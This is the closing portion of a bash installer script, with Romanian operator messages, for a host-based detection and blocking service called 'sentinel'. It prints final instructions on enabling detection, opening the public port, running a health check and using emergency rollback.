      sed -i 's/enabled: false/enabled: true/' ${SENTINEL_CONFIG_DIR}/sentinel.yaml
      systemctl restart sentinel-detect

  PORTUL ${PUBLIC_PORT} TREBUIE DESCHIS în firewall-ul providerului. nftables pe
  această gazdă este deny-lister cu 'policy accept' și nu îl blochează, dar un
  security group din cloud o face. Verifică din exterior:

      curl -sk -o /dev/null -w '%{http_code}
' https://${banner_host}:${PUBLIC_PORT}/healthz

  Ieșiri de urgență:
      touch ${SENTINEL_CONFIG_DIR}/PANIC     -> blocklist golit în ≤60s
      reboot                                 -> blocurile nu se persistă

EOF
    (( WARN_COUNT > 0 )) && warn "${WARN_COUNT} avertisment(e) — vezi mai sus"

    # Ultimul lucru de pe ecran, după bară și după numărul de avertismente:
    # ce mai stă între operator și panou. Vezi comentariul de la definiție.
    report_closing_facts
    return 0
}

main "$@"
